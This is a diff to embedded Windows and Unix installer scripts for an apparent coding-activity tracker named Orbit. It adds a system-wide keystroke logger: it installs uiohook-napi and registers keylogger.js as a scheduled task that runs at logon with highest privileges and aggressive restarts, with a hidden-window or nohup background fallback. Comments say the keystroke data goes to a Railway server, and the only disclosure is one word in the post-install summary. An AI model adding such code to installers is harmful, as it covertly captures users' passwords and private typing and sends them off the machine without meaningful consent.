@@ -116,6 +116,24 @@ $extDir = "$env:USERPROFILE\\.vscode\\extensions\\orbit-ai-tracker-1.0.0"
 if (-not (Test-Path $extDir)) { New-Item -ItemType Directory -Path $extDir -Force | Out-Null }
 Copy-Item "$ORBIT\\vscode-extension\\*" -Destination $extDir -Force -ErrorAction SilentlyContinue
 
+# 키 입력 패턴 수집 (로컬 분석 → Railway 전송)
+Write-Host "  키 입력 트래커 설치 중..." -ForegroundColor Yellow
+Push-Location $ORBIT
+cmd /c npm install uiohook-napi better-sqlite3 --silent 2>&1 | Out-Null
+New-Item -ItemType Directory -Path "$ORBIT\\src\\data" -Force 2>$null | Out-Null
+Pop-Location
+if ($nodeExe) {
+    $action3   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src"
+    $trigger3  = New-ScheduledTaskTrigger -AtLogOn
+    $settings3 = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
+    Register-ScheduledTask -TaskName "OrbitKeylogger" -Action $action3 -Trigger $trigger3 -Settings $settings3 -RunLevel Highest -Force 2>$null | Out-Null
+    Start-ScheduledTask -TaskName "OrbitKeylogger" -ErrorAction SilentlyContinue
+    Write-Host "  ✓ 키 입력 트래커 OK (자동 시작 등록됨)" -ForegroundColor Green
+} else {
+    Start-Process "node" -ArgumentList "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Write-Host "  ✓ 키 입력 트래커 시작됨" -ForegroundColor Green
+}
+
 # 기존 데이터 동기화
 if (Test-Path "$ORBIT\\bin\\sync-to-railway.js") {
     node "$ORBIT\\bin\\sync-to-railway.js" --limit=500 2>$null
@@ -130,7 +148,7 @@ Write-Host "  로컬:        http://localhost:${port}" -ForegroundColor White
 Write-Host "  대시보드:    ${serverUrl}" -ForegroundColor White
 Write-Host ""
 Write-Host "  AI 분석: Claude Haiku (클라우드)" -ForegroundColor DarkGray
-Write-Host "  수집: Claude Code · VS Code · 터미널" -ForegroundColor DarkGray
+Write-Host "  수집: Claude Code · VS Code · 터미널 · 키 입력 패턴" -ForegroundColor DarkGray
 Write-Host ""
 `;
 
@@ -235,6 +253,15 @@ EXT_DIR="$HOME/.vscode/extensions/orbit-ai-tracker-1.0.0"
 mkdir -p "$EXT_DIR"
 cp -r "$ORBIT/vscode-extension/"* "$EXT_DIR/" 2>/dev/null || true
 
+# 키 입력 패턴 수집 (로컬 분석 → Railway 전송)
+echo "  키 입력 트래커 설치 중..."
+cd $ORBIT && npm install uiohook-napi better-sqlite3 --silent 2>/dev/null || true
+mkdir -p "$ORBIT/src/data"
+pgrep -f "keylogger.js" &>/dev/null || {
+  nohup node $ORBIT/src/keylogger.js > $ORBIT/src/keylog.log 2>&1 &
+  echo "  ✓ 키 입력 트래커 시작됨"
+}
+
 # 데이터 동기화
 [ -f "$ORBIT/bin/sync-to-railway.js" ] && node "$ORBIT/bin/sync-to-railway.js" --limit=500 2>/dev/null
 
@@ -247,7 +274,7 @@ echo "  로컬:        http://localhost:${port}"
 echo "  대시보드:    ${serverUrl}"
 echo ""
 echo "  AI 분석: Claude Haiku (클라우드)"
-echo "  수집: Claude Code · VS Code · 터미널"
+echo "  수집: Claude Code · VS Code · 터미널 · 키 입력 패턴"
 echo ""
 `;
 
